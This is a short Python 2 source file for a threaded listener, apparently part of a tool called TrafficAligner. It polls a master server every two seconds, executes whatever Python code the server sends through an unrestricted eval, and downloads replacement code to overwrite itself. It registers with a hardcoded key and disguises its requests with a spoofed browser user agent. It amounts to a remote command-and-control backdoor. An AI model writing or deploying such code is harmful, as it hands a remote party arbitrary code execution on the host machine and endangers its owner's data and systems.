import threading
from utilites import log
import time
import simplejson

import urllib
import urllib2
import hashlib
from utilites import __version__

class CommandListener(threading.Thread):
    master_server_url = ""
    token = ""
    auth_key = 'kjlkj9hjhjhgxxxkhl'

    download_callback = False

    def __init__(self, master_server_url):
        threading.Thread.__init__(self)
        log('Init command listener')
        self.master_server_url = master_server_url
        self.register()


    def register(self):
        answer = self.sendQuery('get_token', {'auth_key':self.auth_key})
        if answer['token']:
            self.token=answer['token']
            log('Registered in server. Got token: '+self.token)
        else:
            log('Get token error', 2)



    def sendQuery(self, command, data={}):
        data['version'] = __version__
        data['token'] = self.token
        log('send command to server: '+ str(command) +' ('+str(data)+')' )

        url = self.master_server_url+'/execute/'+command

        headers = { 'User-Agent' :  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)' }
        data = urllib.urlencode(data)
        req = urllib2.Request(url, data, headers)

        answer = {};

        try:
            response = urllib2.urlopen(req)
            answer = simplejson.loads(response.read())
        except IOError:
            log('Failed to open url: '+str(url),2)

        return answer

    def readCommand(self):
        command = self.sendQuery('get_command')
        cmd = command['command']
        if not cmd: return False


        log('Got command from server: '+cmd, 1)

        func_name = 'command_'+cmd
        params = command['params']

        try:
            getattr(self, func_name)(params)
        except AttributeError:
            log("Command "+func_name+" does not exists", 2)


    def command_download(self, params):
        log('initiate download part '+params['url'])
        self.download_callback(params)

    def command_eval(self, params):
        log('Eval python code: '+params['code'])
        eval(params['code'])

    def command_update(self, params):
        log('Start updating from url: '+params['url'])

        headers = { 'User-Agent' :  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)' }
        req = urllib2.Request(params['url'], "", headers)
        response = urllib2.urlopen(req)
        answer = response.read()

        md5 = hashlib.md5(answer).hexdigest()
        if md5 != params['md5']:
            log('Hash codes missmatch '+md5+' != '+params['md5'], 2)
            return False

        f = open('TrafficAligner_update.py', 'wb')
        f.write(answer)
        f.close()


        self.command_reload()
        print ('Updated')

    def command_reload(self, params={}):
        log('Start reload script')
        #from subprocess import Popen
        #Popen("./reloader", shell=True)
        #exit("exit for updating all files")




    def run(self):
        while True:
            self.readCommand()
            time.sleep(2)

